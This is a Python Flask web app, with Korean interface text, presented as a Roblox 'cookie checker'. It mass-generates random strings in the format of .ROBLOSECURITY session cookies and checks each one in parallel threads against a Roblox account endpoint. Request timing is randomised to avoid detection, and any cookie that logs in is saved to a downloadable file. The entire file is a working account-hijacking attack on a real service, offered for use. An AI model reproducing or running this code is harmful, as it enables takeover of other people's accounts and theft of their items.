import os
import random
import string
import threading
from queue import Queue
import requests
import time
from flask import Flask, jsonify, send_file

app = Flask(__name__)

INTRO = "_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|_"
LETTERS = 'ABCDEF'
URL = 'https://accountinformation.roblox.com/v1/birthdate'

cookie_queue = Queue()
print_lock = threading.Lock()
valid_cookies = []

def generate_cookie():
    return INTRO + ''.join(random.choices(LETTERS + string.digits, k=732))

def check_login(cookie):
    headers = {
        'Cookie': f'.ROBLOSECURITY={cookie}',
        'User-Agent': 'Mozilla/5.0'
    }
    try:
        res = requests.get(URL, headers=headers, timeout=5)
        if res.status_code == 200:
            with print_lock:
                print(f"[로그인 성공] {cookie[:50]}...")
            return True
        else:
            with print_lock:
                print(f"[로그인 실패] 상태 코드: {res.status_code}")
            return False
    except Exception as e:
        with print_lock:
            print(f"[오류] {str(e)}")
        return False

def worker():
    while True:
        cookie = cookie_queue.get()
        if cookie is None:
            break
        if check_login(cookie):
            with print_lock:
                valid_cookies.append(cookie)
        time.sleep(random.uniform(0.3, 1.0))
        cookie_queue.task_done()

@app.route('/')
def index():
    return """
    <h1>로블록스 쿠키 체커</h1>
    <p>명령어 사용법: /쿠키/[개수]  (생성+체크 후 파일로 다운로드)</p>
    """

@app.route('/쿠키/<int:num_cookies>')
def all_in_one(num_cookies):
    global valid_cookies
    valid_cookies = []
    if num_cookies <= 0 or num_cookies > 10000:
        return jsonify({"error": "1~10000 사이 숫자 입력하세요"}), 400

    num_threads = min(50, max(5, num_cookies // 20))
    print(f"쿠키 {num_cookies}개 생성, 스레드 {num_threads}개로 체크 시작")

    for _ in range(num_cookies):
        cookie_queue.put(generate_cookie())

    threads = []
    for _ in range(num_threads):
        t = threading.Thread(target=worker)
        t.daemon = True
        t.start()
        threads.append(t)

    cookie_queue.join()

    for _ in range(num_threads):
        cookie_queue.put(None)
    for t in threads:
        t.join()

    filename = f"roblox_cookies_{random.randint(1000,9999)}.txt"
    with open(filename, 'w', encoding='utf-8') as f:
        if valid_cookies:
            f.write("=== 로그인 성공 쿠키 ===\n\n")
            for c in valid_cookies:
                f.write(c + "\n\n")
            f.write(f"\n총 {len(valid_cookies)}개의 유효 쿠키를 찾음\n")
        else:
            f.write("유효한 쿠키를 찾지 못했습니다.\n")

    print(f"체크 완료! {len(valid_cookies)}개 찾음")
    return send_file(filename, as_attachment=True, download_name="roblox_cookies.txt")

if __name__ == '__main__':
    port = int(os.environ.get('PORT', 5000))
    app.run(host='0.0.0.0', port=port)
